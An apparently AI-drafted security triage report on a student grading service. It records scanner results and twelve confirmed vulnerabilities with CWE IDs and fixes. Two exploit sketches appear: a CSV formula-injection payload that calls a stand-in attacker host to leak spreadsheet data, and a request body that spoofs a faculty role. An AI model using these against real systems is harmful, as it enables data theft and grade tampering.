<!-- AI_DELIVERABLE_METADATA -->
## AI Deliverable Metadata Block

| Field | Value |
|---|---|
| Deliverable | `project-assignment-2/sast-triage-report.md` (CS763 PA2) |
| Author of record | Saniya Bhambhvani |
| AI tool | Claude (Anthropic) agent, Claude Code / Agent SDK harness in the Claude desktop app (see `/Agent_environment.md`) |
| Model | `claude-opus-5-5` (Claude Opus 5.5) |
| Conceptual AI contribution | **~100% AI draft / 0% human edits at commit time.** Update this line after the student's review and revisions |
| Inputs given to the AI | `CS763_ProjectDescription.pdf` (PA2 section), `project-assignment-2/functional-codebase/` at commit `b26062f`, pipeline log `project-assignment-2/pipeline-logs/pa2-run-44004909266.log` |
| Prompt summary | "write sast-triage-report.md … put every Semgrep, SonarQube and Trivy alert in a ledger as a true or false positive … review the code by hand and document at least 3 confirmed vulnerabilities from different layers, each with its CWE ID, file/line and root cause" (full verbatim prompt in [`/.ai_logs/pa2-session-log.md`](../.ai_logs/pa2-session-log.md)) |
| Session link | https://claude.ai/code/session_01Mj79JHpoGSSrKQhMcsCbL5 |
| Human verification status | **PENDING.** Student must re-check each finding against the code before the PA2 release tag |
| Known gap | SonarQube Cloud issues not yet in the ledger: sonarcloud.io is blocked from the agent's network. Student is exporting them; section 2.2 will be completed from that export |

---
<!-- /AI_DELIVERABLE_METADATA -->

# SAST Triage Report — Peer Review & Evaluation Gateway (PA2 naive baseline)

**Target:** `project-assignment-2/functional-codebase/` at commit `b26062f` (the happy-path build).
**Scan run:** GitHub Actions [run 44004909266](https://github.com/saniyaab/MET763-PeerReviewandEvaluation/actions/runs/44004909266), log saved at [`pipeline-logs/pa2-run-44004909266.log`](pipeline-logs/pa2-run-44004909266.log).
**Scope note:** this file is the baseline for PA3 remediation (every confirmed CWE in section 4 must be fixed in PA3) and for the classmate who runs a secure prompt against this repository.

## 1. Summary

| Source | Raw alerts | True positive | False positive | Notes |
|---|---|---|---|---|
| Semgrep 1.150.0 (6 rulesets, 136 rules, 19 files) | **0** | 0 | 0 | Clean scan, but 12 confirmed vulnerabilities exist (section 4): every one is a scanner **false negative** |
| SonarQube Cloud | *pending export* | – | – | See section 2.2 |
| Trivy 0.69.3 — filesystem (`package-lock.json`, secrets, misconfig) | 0 | 0 | 0 | App dependencies clean (`express`, `pg` and their transitive packages) |
| Trivy 0.69.3 — Dockerfile config | 0 | 0 | 0 | Non-root `USER node`, multi-stage, healthcheck present |
| Trivy 0.69.3 — container image | 24 | 24 | 0 | All in the `node:22-alpine` base image: 1 Alpine package, 23 in packages bundled with the global npm CLI. None in the app's own `node_modules` (79 packages, 0 findings) |
| **Manual code review** | – | **12 confirmed** | – | Across 7 layers: authentication, authorization, input, business logic/state, database, output encoding, error handling, resource management |

The scanners and the code tell opposite stories: automated SAST found nothing in the application, while manual review confirmed critical flaws in authentication, authorization and grading logic. Section 3 explains why.

## 2. Raw alert ledger

Classification rules used:

- **True positive (TP):** the flagged weakness or vulnerable component really exists in this repository or image.
- **False positive (FP):** the flagged weakness does not exist, or the flagged code is not what the rule claims.
- Exploitability is recorded separately. A TP can still be low risk when the vulnerable code never runs.

### 2.1 Semgrep

Command (from `.github/workflows/devsecops.yml`): `semgrep scan --config p/typescript --config p/nodejs --config p/expressjs --config p/dockerfile --config p/secrets --config p/security-audit project-assignment-2/functional-codebase Dockerfile docker-compose.yml`

| Log line | Value |
|---|---|
| Rules run | 136 (344 rules loaded; 136 applied to the file types present) |
| Targets | 19 files: 12 TypeScript, 4 JSON, 1 Dockerfile, 1 YAML, plus multilang rules |
| Skipped | 2 files matched Semgrep's default `.semgrepignore` (the `tests/` folder) |
| Result | `Ran 136 rules on 19 files: 0 findings.` |

| ID | Rule | File:line | Classification |
|---|---|---|---|
| – | *(no alerts)* | – | No TPs or FPs to triage. All vulnerabilities in section 4 are **false negatives** of this scan |

### 2.2 SonarQube Cloud

The pipeline log shows `ANALYSIS SUCCESSFUL` and `EXECUTION SUCCESS` (project key `saniyaab_MET763-PeerReviewandEvaluation`, branch `main`), but the scanner does not print issues into the log, and the agent cannot reach sonarcloud.io. **Status: pending the student's export of Issues and Security Hotspots.** Each exported issue will be added below as TP or FP with the same rules.

| ID | Rule | Type / severity | File:line | Classification | Reasoning |
|---|---|---|---|---|---|
| SQ-? | *pending export* | | | | |

### 2.3 Trivy

**Filesystem scan** (`trivy fs --scanners vuln,secret,misconfig project-assignment-2/functional-codebase`): `package-lock.json | npm | 0 vulnerabilities`; no secrets; no config files detected. **Config scan** (`trivy config Dockerfile`): `Dockerfile | 0 misconfigurations`. Nothing to triage.

**Image scan** (`trivy image --input image.tar`, runtime stage of the root `Dockerfile`):

| ID | Package (location in image) | CVE | Severity | Installed → fixed | Classification | Reasoning |
|---|---|---|---|---|---|---|
| TV-01 | `zlib` (Alpine 3.24.4 OS package) | CVE-2026-4738 | MEDIUM | 1.3.2-r1 → 1.4-r0 | TP, low exploitability | Library is present in the image. The service has no compression middleware and never calls zlib directly, so exposure is limited. Fix: rebuild on a patched base image |
| TV-02 | `@sigstore/core` (npm CLI) | CVE-2026-48758 | MEDIUM | 2.0.0 → 3.2.1 | TP, not reachable | All of TV-02…TV-24 live under `usr/local/lib/node_modules/npm/`, the npm CLI that ships in `node:22-alpine`. The container only runs `node dist/server.js` (`CMD` in `Dockerfile`), never `npm` |
| TV-03 | `brace-expansion` (npm CLI) | CVE-2026-102276 | HIGH | 2.0.2 → 2.1.5 | TP, not reachable | DoS via crafted brace patterns; npm never runs in the container |
| TV-04 | `brace-expansion` (npm CLI) | CVE-2026-102278 | HIGH | 2.0.2 → 2.1.6 | TP, not reachable | Same package, uncontrolled recursion |
| TV-05 | `brace-expansion` (npm CLI) | CVE-2026-13149 | HIGH | 2.0.2 → 2.1.2 | TP, not reachable | Exponential-time complexity |
| TV-06 | `brace-expansion` (npm CLI) | CVE-2026-14257 | HIGH | 2.0.2 → 2.1.3 | TP, not reachable | Memory exhaustion in `expand()` |
| TV-07 | `brace-expansion` (npm CLI) | CVE-2026-69152 | HIGH | 2.0.2 → 2.1.4 | TP, not reachable | Bypass of CVE-2026-14257 mitigation |
| TV-08 | `brace-expansion` (npm CLI) | CVE-2026-102277 | MEDIUM | 2.0.2 → 2.1.7 | TP, not reachable | Crafted brace patterns |
| TV-09 | `brace-expansion` (npm CLI) | CVE-2026-33750 | MEDIUM | 2.0.2 → 2.0.3 | TP, not reachable | Zero step value |
| TV-10 | `glob` (npm CLI) | CVE-2026-118773 | MEDIUM | 10.5.0 → 14.0.2 | TP, not reachable | Incomplete traversal cancellation |
| TV-11 | `ip-address` (npm CLI) | CVE-2026-69192 | HIGH | 10.1.0 → 10.3.1 | TP, not reachable | Parsing inconsistency leading to SSRF; the service makes no outbound requests and does not load this package |
| TV-12 | `ip-address` (npm CLI) | CVE-2026-101911 | MEDIUM | 10.1.0 → 10.7.1 | TP, not reachable | Unbounded IPv6 parsing |
| TV-13 | `ip-address` (npm CLI) | CVE-2026-101912 | MEDIUM | 10.1.0 → (no fix listed) | TP, not reachable | Cross-family subnet comparison |
| TV-14 | `ip-address` (npm CLI) | CVE-2026-101913 | MEDIUM | 10.1.0 → 10.5.1 | TP, not reachable | IPv6 link-local validation |
| TV-15 | `ip-address` (npm CLI) | CVE-2026-111997 | MEDIUM | 10.1.0 → 10.7.4 | TP, not reachable | Percent characters in IPv6 |
| TV-16 | `ip-address` (npm CLI) | CVE-2026-42338 | MEDIUM | 10.1.0 → 10.1.1 | TP, not reachable | HTML escaping; nothing renders it here |
| TV-17 | `minimatch` (npm CLI) | CVE-2026-118764 | MEDIUM | 9.0.9 → 11.0.1 | TP, not reachable | Crafted glob pattern expansion |
| TV-18 | `pacote` 19.0.2 (npm CLI, `node_modules/pacote`) | CVE-2026-9496 | HIGH | 19.0.2 → 21.5.1 | TP, not reachable | Crafted `spec.rawSpec`
| TV-19 | `picomatch` (npm CLI) | CVE-2026-33671 | HIGH | 4.0.3 → 4.0.4 | TP, not reachable | ReDoS via extglob |
| TV-20 | `picomatch` (npm CLI) | CVE-2026-33672 | MEDIUM | 4.0.3 → (no fix listed) | TP, not reachable | POSIX bracket method injection |
| TV-21 | `postcss-selector-parser` (npm CLI) | CVE-2026-104844 | MEDIUM | 7.1.1 → 7.1.6 | TP, not reachable | Crafted CSS selectors |
| TV-22 | `postcss-selector-parser` (npm CLI) | CVE-2026-9358 | LOW | 7.1.1 → 7.1.3 | TP, not reachable | Recursion in AST serialization |
| TV-23 | `sigstore` (npm CLI) | CVE-2026-48815 | HIGH | 3.1.0 → 4.1.1 | TP, not reachable | `certificateOIDs` ignored |
| TV-24 | `pacote` 20.0.1 (npm CLI, second copy under `@npmcli/metavuln-calculator/node_modules/pacote`) | CVE-2026-9496 | HIGH | 20.0.1 → 21.5.1 | TP, not reachable | Same CVE as TV-18 in a second installed copy; Trivy counts it separately. Totals match the log: Alpine `Total: 1 (MEDIUM: 1)`; node-pkg `Total: 23 (LOW: 1, MEDIUM: 12, HIGH: 10)`

**Why TPs and not FPs:** each package is really at the vulnerable version in the shipped image, so the scanner is correct. They are classified low risk because the vulnerable code path (the npm CLI) is never executed by the service. The image still ships them, and a later `docker exec … npm …` or a future `CMD` change would make them reachable. Remediation (section 5): remove npm from the runtime stage or move to a distroless/`node:22-alpine` variant without npm, and rebuild when the base image is patched.

## 3. Why the scanners missed the real vulnerabilities

1. **No pattern to match.** The worst flaws are *missing* controls: no authentication middleware, no ownership check, no role check. Semgrep's Express rules look for dangerous calls (string-built SQL, `eval`, `res.send(req.query…)`), not for routes that lack a guard.
2. **The code that does exist is "clean".** Every SQL statement is parameterized (`$1…$n`) and the only dynamic `ORDER BY` uses an allowlist (`reviews.ts:174-193`), so injection rules correctly stay quiet.
3. **Business logic is invisible to SAST.** Grade inflation via out-of-range scores, ballot-stuffing peer reviews, self-assigned faculty roles and the TOCTOU on the rubric "in use" rule need knowledge of the grading domain.
4. **Data flows across files.** User input enters in `routes/evaluations.ts`, is scored in `services/scoring.ts` and leaves as CSV in `services/aggregation.ts`. Community Semgrep rules are mostly single-file and do not track a JSON body field into a CSV export.
5. **Tests were skipped.** Semgrep's default ignore list excluded `tests/`, which is harmless here but means test code is unreviewed by SAST.

## 4. Confirmed vulnerabilities (manual review)

**Validation method.** Each finding was confirmed by tracing the code path line by line (C). Where the passing CI integration tests already exercise the vulnerable path without any credentials, that is listed as runtime evidence (R). Full exploit proofs against the running container belong to PA4.

Severity uses likelihood × impact for this service (a campus grading system where grade integrity and peer anonymity matter most).

| ID | Layer | Vulnerability | CWE | Severity | Location | Validation |
|---|---|---|---|---|---|---|
| V-01 | Authentication | No authentication on any endpoint | **CWE-306** Missing Authentication for Critical Function | Critical | `src/app.ts:47`; `src/routes/evaluations.ts:40-120` | C + R |
| V-02 | Authorization (object level) | Any caller can read, change or delete any review (BOLA/IDOR) | **CWE-639** Authorization Bypass Through User-Controlled Key | Critical | `src/services/reviews.ts:120-130, 204-237`; `src/routes/evaluations.ts:89-100` | C + R |
| V-03 | Authorization (identity/role) | Reviewer identity and role are taken from the request body; a student can submit as faculty | **CWE-269** Improper Privilege Management (related CWE-639) | Critical | `src/services/reviews.ts:140-145, 154` | C + R (partial) |
| V-04 | Authorization (function level) | Rubric management and full grade/comment export are open to every caller | **CWE-862** Missing Authorization (related CWE-359) | High | `src/routes/evaluations.ts:40-65, 103-120`; `src/services/aggregation.ts:210-306` | C + R |
| V-05 | Input validation | Scores and rubric numbers are not type- or range-checked: grades above 100, negative grades, crash on non-numeric score | **CWE-1284** Improper Validation of Specified Quantity in Input (related CWE-20) | High | `src/services/reviews.ts:112-118, 156-161`; `src/services/scoring.ts:84-90, 119-122`; `src/services/rubrics.ts:77` | C |
| V-06 | Business logic | Unlimited reviews per reviewer per project, and project members can review their own project | **CWE-837** Improper Enforcement of a Single, Unique Action | High | `src/schema.ts:85-97`; `src/services/reviews.ts:132-165` | C |
| V-07 | State machine / concurrency | Check-then-act races on the rubric "in use" lock and on the governing-rubric lookup | **CWE-367** Time-of-check Time-of-use Race Condition (related CWE-362) | Medium | `src/services/rubrics.ts:187-218`; `src/services/reviews.ts:134-163` | C |
| V-08 | Output encoding | CSV formula injection in the consolidated report | **CWE-1236** Improper Neutralization of Formula Elements in a CSV File | High | `src/services/aggregation.ts:308-312, 346, 354` | C |
| V-09 | Error handling | Raw database and runtime error messages returned to the client | **CWE-209** Generation of Error Message Containing Sensitive Information | Medium | `src/app.ts:53-57` | C |
| V-10 | Resource management | Unbounded criteria nesting (synchronous recursion) and unpaginated result sets | **CWE-674** Uncontrolled Recursion; **CWE-770** Allocation of Resources Without Limits | Medium | `src/services/scoring.ts:63-67, 84-96`; `src/services/rubrics.ts:65-83`; `src/routes/evaluations.ts:45-52, 79-87, 103-120` | C |
| V-11 | Database | App connects as the PostgreSQL superuser and runs DDL at every start | **CWE-250** Execution with Unnecessary Privileges | Medium | `docker-compose.yml:24, 43-44`; `src/schema.ts:109-110`; `src/server.ts:28` | C |
| V-12 | Data protection | Identity of "anonymous" peer reviewers and all review comments stored in cleartext | **CWE-312** Cleartext Storage of Sensitive Information (related CWE-359) | Medium | `src/schema.ts:85-97, 100-106` | C |

Layers covered: Authentication (V-01), Authorization (V-02, V-03, V-04), Input (V-05), Business logic / State machine (V-06, V-07), Output (V-08), Error handling (V-09), Resource (V-10), Database (V-11, V-12). The assignment minimum is 3 findings across different layers.

### V-01 — Missing authentication on every endpoint (CWE-306) · Critical

- **Where:** `src/app.ts:47` mounts `evaluationsRouter(pool)` with no middleware in front of it; none of the 12 handlers in `src/routes/evaluations.ts:40-120` checks who is calling.
- **Root cause:** the happy-path prompt asked for functionality only, so the agent never introduced an identity concept. The service trusts the network: any process that can reach port 3000 has full read/write access.
- **Impact:** every other finding becomes remotely exploitable by an anonymous caller.
- **Runtime evidence:** all 20 integration tests in run 44004909266 create, update and delete rubrics and reviews with plain `fetch()` calls carrying no credentials, and all pass.

### V-02 — Broken object-level authorization on reviews (CWE-639) · Critical

- **Where:** `getReview`, `updateReview`, `deleteReview` in `src/services/reviews.ts:120-130, 204-237`, routed from `src/routes/evaluations.ts:89-100`.
- **Root cause:** the only "authorization" is that the `review_id` belongs to the `project_id` in the URL (`WHERE r.id::text = $1 AND r.project_id::text = $2`). Both values are user-controlled and discoverable (`GET /projects/{id}/reviews` lists every review id). There is no owner check against the caller.
- **Impact:** a student can rewrite or delete the faculty evaluation of any project, or raise their own peer scores after the fact. Reviews are the service's primary resource, so this is the row-level authorization gap PA3 must close.
- **Runtime evidence:** the integration test "PUT /projects/{id}/reviews/{review_id} updates scores and recomputes the grade" changes another reviewer's review from 60 to 100 with no identity.

### V-03 — Client-asserted reviewer identity and role (CWE-269, related CWE-639) · Critical

- **Where:** `createReview`, `src/services/reviews.ts:140-145` and the INSERT at line 154.
- **Root cause:** `reviewer_id` is taken from the JSON body, and `reviewer_role` is used **as sent**. The user's stored role in `users.role` is only consulted when the body omits `reviewer_role`, and is never compared with the role the client claims.
- **Exploit sketch:** `POST /projects/{own_project}/reviews` with `{"reviewer_id": "<any student id>", "reviewer_role": "faculty_instructor", "scores": [...]}`. The review is stored and aggregated as a faculty evaluation, and the composite grade weights faculty at 70% (`src/services/scoring.ts`, `FACULTY_WEIGHT`). A faculty member can also file reviews as `student_peer` and hide behind peer anonymity.
- **Runtime evidence (partial):** the faculty-review integration test is accepted purely because the body says `"reviewer_role": "faculty_instructor"`.

### V-04 — Missing function-level authorization on rubrics and reports (CWE-862) · High

- **Where:** rubric routes `src/routes/evaluations.ts:40-65`; report route `103-120` → `buildReport` `src/services/aggregation.ts:210-306`.
- **Root cause:** no role model. Creating, rescoping or deleting a rubric changes which rubric governs which projects (`recomputeBindings`, `src/services/rubrics.ts:90-111`), and `/reports?include_comments=true` returns every project's grades and every raw comment for a course or lab, all to any caller.
- **Impact:** students can swap their project onto a lenient rubric before grading starts (create a `project`-scoped rubric, which outranks the course rubric) and can bulk-export confidential grades (education-records privacy, CWE-359).

### V-05 — No validation of score values and rubric numbers (CWE-1284, related CWE-20) · High

- **Where:** `scoreReview` `src/services/reviews.ts:112-118` converts with `Number(s.score)` and nothing else; `nodeFraction` `src/services/scoring.ts:84-90` divides by `max_points` with no clamp; criteria are inserted with any `weight`/`max_points` (`src/services/rubrics.ts:77`).
- **Root cause:** the agent validated nothing it was not told to validate. Concrete outcomes:
  - `score: 1000` on a 10-point criterion → `total_score` far above 100, `letter_grade` "A".
  - Negative scores → negative totals that drag a peer's mean down.
  - `score: "abc"` → `NaN` → `toGrade(NaN)` finds no scale entry and dereferences `undefined` (`src/services/scoring.ts:120-121`) → HTTP 500.
  - `criterion_id` from a different rubric is accepted (FK only checks that the criterion exists), polluting that project's criterion matrix.
  - Missing `scores` array → `TypeError` → 500.

### V-06 — No single-review rule and no conflict-of-interest rule (CWE-837) · High

- **Where:** `reviews` table `src/schema.ts:85-97` has no `UNIQUE (project_id, reviewer_id)`; `createReview` `src/services/reviews.ts:132-165` never checks `project_members`.
- **Root cause:** the spec says reviews are "multi-reviewer" but never says "one per reviewer", and the agent did not infer the obvious academic rule.
- **Impact:** one student can post 50 peer reviews of 100 for their own project, or 50 reviews of 0 for a rival; the peer mean and standard deviation in `/summary` and `/reports` are then meaningless.

### V-07 — TOCTOU on the rubric lock and governing rubric (CWE-367) · Medium

- **Where:** `updateRubric` / `deleteRubric` call `assertNotInUse` (`src/services/rubrics.ts:187-192`) **before** opening the transaction (`194-218`, `220-228`). `createReview` reads the governing rubric (`src/services/reviews.ts:134`) and scores against it (`147`) outside the insert transaction (`149-163`).
- **Root cause:** check and act are separate statements at PostgreSQL's default READ COMMITTED isolation, with no row lock (`SELECT … FOR UPDATE`) and no constraint enforcing the rule.
- **Impact:** a rubric's title/scope can be changed after the first review lands (the spec says in-use rubrics must not change); a review can be stored against rubric A while a concurrently created, more specific rubric B becomes the project's governing rubric, breaking the "exactly one governing rubric" invariant. Deleting criteria of an in-use rubric is still stopped by the `review_scores` foreign key, but only with a raw 500 error (see V-09).

### V-08 — CSV formula injection in the report export (CWE-1236) · High

- **Where:** `csvCell` `src/services/aggregation.ts:308-312` only adds quotes when a value contains `"`, `,` or a newline. Review comments (`354`) and criterion titles (`346`) are written verbatim.
- **Root cause:** CSV was treated as a data format, not as something an instructor will open in Excel or Google Sheets.
- **Exploit sketch:** a peer submits `comment: "=HYPERLINK(\"http://attacker.example/?\"&A2,\"View rubric\")"`. When an instructor downloads `/reports?course_id=CS763&include_comments=true` and opens it, the cell becomes a live formula (quoting does not stop evaluation).

### V-09 — Internal error messages returned to clients (CWE-209) · Medium

- **Where:** global error handler `src/app.ts:53-57` returns `err.message` for every error, including unexpected 500s.
- **Root cause:** convenient for debugging, never revisited.
- **Examples of what leaks:** PostgreSQL messages with table, column and constraint names (e.g. a duplicate `criterion_id` in one review returns the `review_scores_pkey` violation; a rubric without `title` returns the `rubrics.title` not-null violation; a non-UUID `created_by` returns the uuid parse error), and JavaScript internals such as `Cannot read properties of undefined (reading 'letter')`. The handler also ignores the `status` that Express's JSON parser sets, so a malformed JSON body (normally 400) or a body over 1 MB (normally 413) comes back as **500** with the parser's message. This maps the schema for an attacker and turns client errors into server errors in monitoring.

### V-10 — Uncontrolled recursion and unbounded results (CWE-674, CWE-770) · Medium

- **Where:** `insertCriteria` recursion `src/services/rubrics.ts:65-83`; synchronous recursion in `sortTree` `src/services/scoring.ts:63-67` and `nodeFraction`/`weightedFraction` `84-96`; list endpoints with no `LIMIT` `src/routes/evaluations.ts:45-52, 79-87, 103-120`; `hydrate` issues three queries per rubric (`src/services/rubrics.ts:123-135, 184`).
- **Root cause:** no depth, count or page limits; only the 1 MB JSON body cap in `src/app.ts:28`.
- **Impact:** a single 1 MB rubric with tens of thousands of nested `subcriteria` levels triggers one INSERT per level, then makes every later read of that rubric (and every review against it) recurse deeply enough to risk a `RangeError: Maximum call stack size exceeded`. Large review sets grow every list and report response without bound.

### V-11 — Application runs as the database superuser (CWE-250) · Medium

- **Where:** `docker-compose.yml:43-44` creates the PostgreSQL account from `POSTGRES_USER`, which the official image makes a **superuser**; the app uses the same account (`docker-compose.yml:24`) and executes the full schema DDL on every start (`src/schema.ts:109-110`, `src/server.ts:28`).
- **Root cause:** one account for setup and runtime.
- **Impact:** any future SQL injection or compromised app process gets superuser rights over the database (drop tables, read all data, `COPY … PROGRAM` on the DB container).

### V-12 — Cleartext storage of peer identity and review content (CWE-312) · Medium

- **Where:** `reviews.reviewer_id`, `reviews.comment` and `review_scores.feedback` (`src/schema.ts:85-97, 100-106`) are plain columns.
- **Root cause:** anonymity was implemented only at the API presentation layer (`present()`, `src/services/reviews.ts:72-89`).
- **Impact:** anyone with database or backup access can de-anonymize every peer review. PA3 requires application-layer encryption of the domain's designated sensitive field, with the key read from an environment variable.

### Checked and not vulnerable (negative results)

| Area | What was checked | Result |
|---|---|---|
| SQL injection | Every `query()` call in `src/services/*.ts` | All parameterized; dynamic `WHERE` fragments add placeholders only; `ORDER BY` column comes from `SORT_COLUMNS` allowlist and direction is fixed to `ASC`/`DESC` (`src/services/reviews.ts:174-193`). Not vulnerable |
| Header injection | `res.attachment(\`evaluation-report-${scope}.csv\`)` (`src/routes/evaluations.ts:118`) | Express's `content-disposition` encodes the filename and Node rejects CR/LF in headers. Not vulnerable |
| XSS | Responses | JSON or `text/csv` only; no HTML rendering. Not applicable (CSV risk covered by V-08) |
| Secrets in repo | `.env`, source, compose | No hard-coded credentials; `.env` is git-ignored; the DB password is required from the environment (`:?` guard) |
| Container hardening | `Dockerfile`, `docker-compose.yml` | Runs as non-root `node`, `read_only: true`, `no-new-privileges`, DB not published to the host, app bound to `127.0.0.1` |

## 5. Remediation hand-off to PA3

Every confirmed CWE above is in PA3's mandatory remediation scope. Planned fixes (details in `security-analysis.md`, section 7):

| ID | Fix | PA3 minimum requirement it satisfies |
|---|---|---|
| V-01 | JWT middleware: RS256/ES256 only (reject `none`, `HS256`), verify `exp`, `iss`, `aud` against the mock issuer's JWKS | (1), (2) |
| V-02 | Row-level authorization on reviews: owner or course faculty may update/delete; peers see only anonymized data | (3) |
| V-03 | Take `reviewer_id` and role from verified token claims, never from the body | (1)–(3) |
| V-04 | Role matrix: rubric write and report export limited to `faculty_instructor` of that course/lab | (3) |
| V-05 | Schema validation (e.g. zod) on all write bodies: score `0 ≤ s ≤ max_points`, finite numbers, criteria must belong to the governing rubric, every leaf scored once | (5) |
| V-06 | `UNIQUE (project_id, reviewer_id)`; reject reviewers listed in `project_members` | (5) |
| V-07 | Do the check inside the transaction with `SELECT … FOR UPDATE` on the rubric row (or `SERIALIZABLE`) | – |
| V-08 | Prefix cells starting with `=`, `+`, `-`, `@`, tab or CR with `'` | – |
| V-09 | Generic message plus correlation ID for 5xx; map known DB errors to 400/409 | – |
| V-10 | Max criteria depth/count, `LIMIT`/`OFFSET` pagination, cap `scores` length | (5) |
| V-11 | Separate migration role; runtime role with only `SELECT/INSERT/UPDATE/DELETE` on service tables | – |
| V-12 | AES-256-GCM encryption of the designated sensitive field (peer reviewer identity and/or comment text), key from env var | (4) |

Trivy TV-01…TV-24: rebuild on a patched base image and drop the npm CLI from the runtime stage.
